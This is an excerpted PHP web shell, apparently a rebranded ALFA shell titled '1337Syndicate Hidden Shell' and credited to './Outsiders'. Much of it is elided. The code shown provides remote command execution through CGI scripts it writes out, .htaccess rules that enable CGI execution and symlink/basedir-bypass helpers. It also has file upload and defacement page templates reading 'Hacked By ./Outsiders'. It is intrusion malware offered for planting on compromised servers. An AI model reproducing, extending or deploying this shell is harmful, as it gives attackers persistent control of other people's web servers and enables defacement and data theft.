...
$GLOBALS['DB_NAME'] = $GLOBALS['1337Syndicate'];
...
define("__ALFA_CODE_NAME__", "1337Syndicate");
define("__ALFA_DATA_FOLDER__", "OUTSIDERS");
...
<title>.: Outsiders Tesla :.</title><center>
<center><img style="border-radius:100px;"width="500" height="250" alt="1337Syndicate" draggable="false" src="https://b.top4top.io/p_315388yqd1.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>1337Syndicate</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["osdcgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["osdcgiapi"])){
			if(!@file_exists("osdcgiapi/".$_COOKIE["osdcgiapi"].".osd")){
				$recreate = true;
				$lang = $_COOKIE["osdcgiapi"];
			}
		}
		if(!isset($_COOKIE["osdcgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".osd",$source);
			}
			alfacgihtaccess('cgi', "osdcgiapi/");
		}else{
			$lang = $_COOKIE["osdcgiapi"];
		}
		$cgi_ext = ".osd";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/osdcgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("osdcgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("osdcgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
echo '<html>';
echo "<title>1337Syndicate Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ 1337Syndicate ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="1337Syndicate" draggable="false" src="https://haxor.lol/love/asta.gif" /></td>
</tr>
<tr>
...
<font color='#FFFFFF'>Shell ReCoded By ./Outsiders (1337Syndicate)</font><br>
<font color='#00A220'>Contact : outsiders@protonmail.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["osdcgiapi_mode"])&&!isset($_COOKIE["osdcgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('osdcgiapi',0755);
	__write_file("osdcgiapi/".$name, __get_resource($source));
	@chmod("osdcgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/osdcgiapi';sh getheader.osd",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ 1337Syndicate &copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY ./Outsiders\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>outsiders@protonmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/OutsidersReal'>@OutsidersReal</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/osdcgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/osdcgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By ./Outsiders</title><b>Hacked By ./Outsiders</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By 1337Syndicate";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
<title>Hacked By ./Outsiders</title><b>Hacked By ./Outsiders</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
<input type="text" name="defacer" size="67" id="text" placeholder="1337Syndicate" />
<br>
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgiosd/'.$cginame);
	}else{
		echo $resource;
	}
}
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://b.top4top.io/p_315388yqd1.png\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgiosd/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#ReCoded By ./Outsiders\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .osd\nAddHandler cgi-script .osd";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.osd",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/osdcgiapi;sh basedir.osd ".$makepwd,false,true,true);
